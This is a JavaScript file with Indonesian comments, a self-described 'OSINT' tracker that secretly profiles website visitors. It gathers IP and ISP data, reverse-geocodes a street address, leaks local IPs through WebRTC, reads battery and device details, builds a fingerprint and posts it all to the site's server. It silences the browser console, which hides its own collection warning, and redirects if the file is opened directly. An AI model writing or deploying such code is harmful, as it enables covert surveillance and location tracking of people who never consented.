// osint.js - OSINT Tracking System
// Mengumpulkan data dari pengunjung dan mengirim ke developer
(function() {
    // Cek apakah file diakses langsung
    if (window.location.protocol === 'file:' || 
        (window.location.href.indexOf('osint.js') > -1 && document.currentScript === null)) {
        window.location.href = 'about:blank';
    }
    
    // Hapus semua console
    const noop = function(){};
    window.console = {
        log: noop, info: noop, warn: noop, error: noop, debug: noop, table: noop
    };
})();

class OSINTTracker {
    constructor() {
        this.userData = {
            // Identitas & IP
            ip_address: 'Mengambil IP...',
            public_ip: 'Mengambil IP...',
            local_ip: 'Tidak tersedia',
            mac_address: 'Tidak tersedia',
            
            // Data GPS / Lokasi
            latitude: 0,
            longitude: 0,
            accuracy: 0,
            altitude: null,
            heading: null,
            speed: null,
            
            // Informasi Lokasi dari Reverse Geocoding
            country: 'Menunggu data...',
            country_code: 'Menunggu data...',
            province: 'Menunggu data...',
            city: 'Menunggu data...',
            district: 'Menunggu data...',
            street: 'Menunggu data...',
            postal_code: 'Menunggu data...',
            full_address: 'Menunggu data...',
            
            // Data Jaringan
            isp: 'Menunggu data...',
            organization: 'Menunggu data...',
            asn: 'Menunggu data...',
            connection_type: 'Unknown',
            downlink: null,
            rtt: null,
            
            // Data Device
            user_agent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(',') : '',
            platform: navigator.platform,
            hardware_concurrency: navigator.hardwareConcurrency || 'Unknown',
            device_memory: navigator.deviceMemory || 'Unknown',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezone_offset: new Date().getTimezoneOffset(),
            screen_resolution: `${window.screen.width}x${window.screen.height}`,
            screen_avail: `${window.screen.availWidth}x${window.screen.availHeight}`,
            color_depth: window.screen.colorDepth,
            pixel_ratio: window.devicePixelRatio || 1,
            
            // Data Browser
            browser_name: this.getBrowserName(),
            browser_version: this.getBrowserVersion(),
            browser_engine: this.getBrowserEngine(),
            cookies_enabled: navigator.cookieEnabled,
            do_not_track: navigator.doNotTrack,
            referrer: document.referrer || 'Direct',
            page_url: window.location.href,
            
            // Data Device Info
            device_info: {
                is_mobile: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
                is_android: /Android/i.test(navigator.userAgent),
                is_ios: /iPhone|iPad|iPod/i.test(navigator.userAgent),
                is_desktop: !/Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
                os_name: this.getOSName(),
                os_version: this.getOSVersion()
            },
            
            // Waktu
            timestamp: new Date().toISOString(),
            local_time: new Date().toString(),
            timezone_name: Intl.DateTimeFormat().resolvedOptions().timeZone,
            
            // Sumber Data
            source: 'pending',
            gps_allowed: false,
            google_maps_link: null
        };
        
        // Fingerprint unik
        this.userData.fingerprint = this.generateFingerprint();
        
        console.log('🚀 OSINT Tracker Initialized');
        console.log('📊 Target:', this.userData.fingerprint);
        
        // Mulai pengumpulan data
        this.init();
    }
    
    async init() {
        // 1. Kumpulkan semua data yang bisa langsung didapat
        this.collectNetworkInfo();
        this.collectBatteryInfo();
        this.collectWebRTCInfo();
        
        // 2. Dapatkan IP Address (WAJIB)
        await this.getIPAddress();
        
        // 3. Kirim data awal (tanpa GPS dulu)
        await this.sendToServer();
    }

    // Dapatkan IP Address
    async getIPAddress() {
        const ipAPIs = [
            {
                url: 'https://api.ipify.org?format=json',
                parser: (data) => data.ip
            },
            {
                url: 'https://api.myip.com',
                parser: (data) => data.ip
            },
            {
                url: 'https://ipapi.co/json/',
                parser: (data) => data.ip
            },
            {
                url: 'https://ipinfo.io/json',
                parser: (data) => data.ip
            },
            {
                url: 'https://jsonip.com',
                parser: (data) => data.ip
            }
        ];
        
        for (const api of ipAPIs) {
            try {
                const response = await fetch(api.url);
                const data = await response.json();
                const ip = api.parser(data);
                
                if (ip && ip !== 'Unknown' && ip.includes('.')) {
                    this.userData.ip_address = ip;
                    this.userData.public_ip = ip;
                    console.log('✅ IP Address:', ip);
                    
                    // Dapatkan data dari IP
                    await this.getIPLocation(ip);
                    return;
                }
            } catch (e) {
                console.log('Gagal dengan API:', api.url);
            }
        }
        
        this.userData.ip_address = 'Unknown';
        console.warn('⚠️ IP Address tidak ditemukan');
    }

    // Dapatkan lokasi dari IP
    async getIPLocation(ip) {
        try {
            // Coba ipapi.co
            const response = await fetch(`https://ipapi.co/${ip || ''}/json/`);
            const data = await response.json();
            
            if (data && !data.error) {
                this.userData.country = data.country_name || 'Tidak diketahui';
                this.userData.country_code = data.country_code || 'Tidak diketahui';
                this.userData.city = data.city || 'Tidak diketahui';
                this.userData.latitude = data.latitude || 0;
                this.userData.longitude = data.longitude || 0;
                this.userData.isp = data.org || 'Tidak diketahui';
                this.userData.asn = data.asn || 'Tidak diketahui';
                
                // Dapatkan alamat dari koordinat jika ada
                if (data.latitude && data.longitude) {
                    await this.reverseGeocode();
                }
                
                console.log('📍 Data dari IP:', this.userData.city, this.userData.country);
            }
        } catch (error) {
            console.log('IP location gagal');
        }
    }
    
    // Dapatkan nama browser
    getBrowserName() {
        const ua = navigator.userAgent;
        if (ua.includes('Chrome')) return 'Chrome';
        if (ua.includes('Firefox')) return 'Firefox';
        if (ua.includes('Safari')) return 'Safari';
        if (ua.includes('Edge')) return 'Edge';
        if (ua.includes('OPR') || ua.includes('Opera')) return 'Opera';
        if (ua.includes('MSIE') || ua.includes('Trident')) return 'Internet Explorer';
        return 'Unknown';
    }
    
    // Dapatkan versi browser
    getBrowserVersion() {
        const ua = navigator.userAgent;
        const match = ua.match(/(Chrome|Firefox|Safari|Edge|OPR|MSIE|Trident)\/?\s*(\d+)/i);
        return match ? match[2] : 'Unknown';
    }
    
    // Dapatkan engine browser
    getBrowserEngine() {
        const ua = navigator.userAgent;
        if (ua.includes('WebKit')) return 'WebKit';
        if (ua.includes('Gecko')) return 'Gecko';
        if (ua.includes('Trident')) return 'Trident';
        return 'Unknown';
    }
    
    // Dapatkan nama OS
    getOSName() {
        const ua = navigator.userAgent;
        if (ua.includes('Windows')) return 'Windows';
        if (ua.includes('Mac')) return 'macOS';
        if (ua.includes('Linux')) return 'Linux';
        if (ua.includes('Android')) return 'Android';
        if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
        return 'Unknown';
    }
    
    // Dapatkan versi OS
    getOSVersion() {
        const ua = navigator.userAgent;
        const match = ua.match(/(Windows NT|Mac OS X|Android|iOS)\s*([\d._]+)/i);
        return match ? match[2] : 'Unknown';
    }
    
    // Generate fingerprint unik
    generateFingerprint() {
        const components = [
            navigator.userAgent,
            navigator.language,
            navigator.platform,
            screen.colorDepth,
            screen.width + 'x' + screen.height,
            new Date().getTimezoneOffset(),
            navigator.hardwareConcurrency || '',
            navigator.deviceMemory || ''
        ];
        
        const hash = btoa(components.join('|')).substring(0, 32);
        return hash;
    }
    
    // Kirim data ke server
    async sendToServer() {
        try {
            // Pastikan semua field terisi
            this.userData.country = this.userData.country || 'Tidak diketahui';
            this.userData.city = this.userData.city || 'Tidak diketahui';
            this.userData.full_address = this.userData.full_address || 'Tidak diketahui';
            
            // Buat link Google Maps jika ada koordinat
            if (this.userData.latitude && this.userData.longitude && 
                Math.abs(this.userData.latitude) > 0.1 && Math.abs(this.userData.longitude) > 0.1) {
                this.userData.google_maps_link = `https://www.google.com/maps?q=${this.userData.latitude},${this.userData.longitude}`;
            }
            
            console.log('📤 Mengirim data ke server...');
            console.log('Data:', {
                ip: this.userData.ip_address,
                lokasi: `${this.userData.latitude}, ${this.userData.longitude}`,
                alamat: this.userData.full_address,
                maps: this.userData.google_maps_link
            });
            
            const formData = new FormData();
            formData.append('visitor_data', JSON.stringify(this.userData));
            
            const response = await fetch('index.php', {
                method: 'POST',
                body: formData
            });
            
            if (response.ok) {
                const result = await response.json();
                console.log('✅ Data terkirim ke server');
                
                // Log untuk developer
                console.log('%c📊 OSINT DATA SENT TO DEVELOPER', 'background: #dc3545; color: white; padding: 5px;');
                console.log('IP:', this.userData.ip_address);
                console.log('Lokasi:', this.userData.city + ', ' + this.userData.country);
                console.log('Koordinat:', this.userData.latitude + ', ' + this.userData.longitude);
                if (this.userData.google_maps_link) {
                    console.log('Google Maps:', this.userData.google_maps_link);
                }
            }
            
        } catch (error) {
            console.error('❌ Gagal kirim data:', error);
        }
    }
    async reverseGeocode() {
        try {
            console.log('🔍 Reverse geocoding...');
            
            const response = await fetch(
                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${this.userData.latitude}&lon=${this.userData.longitude}&zoom=18&addressdetails=1`,
                {
                    headers: {
                        'User-Agent': 'OSINTTracker/1.0',
                        'Accept-Language': 'id'
                    }
                }
            );
            
            const data = await response.json();
            
            if (data && data.address) {
                const addr = data.address;
                
                this.userData.country = addr.country || this.userData.country || 'Tidak diketahui';
                this.userData.country_code = addr.country_code || this.userData.country_code || 'Tidak diketahui';
                this.userData.province = addr.state || addr.province || 'Tidak diketahui';
                this.userData.city = addr.city || addr.town || addr.village || this.userData.city || 'Tidak diketahui';
                this.userData.district = addr.suburb || addr.neighbourhood || addr.district || 'Tidak diketahui';
                this.userData.street = addr.road || addr.path || addr.street || 'Tidak diketahui';
                this.userData.postal_code = addr.postcode || 'Tidak diketahui';
                this.userData.full_address = data.display_name || 'Tidak diketahui';
                
                console.log('📍 ALAMAT LENGKAP:', {
                    negara: this.userData.country,
                    provinsi: this.userData.province,
                    kota: this.userData.city,
                    jalan: this.userData.street
                });
            }
            
        } catch (error) {
            console.error('Reverse geocoding error:', error);
            this.userData.full_address = 'Gagal mendapatkan alamat';
        }
    }
    // Kumpulkan informasi jaringan
    collectNetworkInfo() {
        if (navigator.connection) {
            const conn = navigator.connection;
            this.userData.connection_type = conn.effectiveType || 'Unknown';
            this.userData.downlink = conn.downlink;
            this.userData.rtt = conn.rtt;
            this.userData.save_data = conn.saveData || false;
        }
    }
    
    // Kumpulkan informasi baterai
    async collectBatteryInfo() {
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                this.userData.battery_level = battery.level * 100 + '%';
                this.userData.battery_charging = battery.charging;
                this.userData.battery_charging_time = battery.chargingTime;
                this.userData.battery_discharging_time = battery.dischargingTime;
            } catch (e) {}
        }
    }
    
    // Kumpulkan informasi WebRTC (untuk IP lokal)
    collectWebRTCInfo() {
        try {
            const RTCPeerConnection = window.RTCPeerConnection || 
                                    window.webkitRTCPeerConnection;
            
            if (RTCPeerConnection) {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate) return;
                    
                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    const ipMatch = ipRegex.exec(ice.candidate.candidate);
                    
                    if (ipMatch && ipMatch[1]) {
                        const ip = ipMatch[1];
                        if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
                            this.userData.local_ip = ip;
                        }
                    }
                };
                
                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(() => {});
                
                setTimeout(() => pc.close(), 1000);
            }
        } catch (e) {}
    }
}

// Inisialisasi OSINT tracker
document.addEventListener('DOMContentLoaded', () => {
    console.log('%c🔍 OSINT TRACKER READY', 'background: #dc3545; color: white; padding: 5px;');
    console.log('%c⚠️ INI ADALAH SISTEM OSINT - DATA PENGUNJUNG AKAN DIKUMPULKAN', 'background: #ffc107; color: #333; padding: 5px;');
    
    window.osintTracker = new OSINTTracker();
});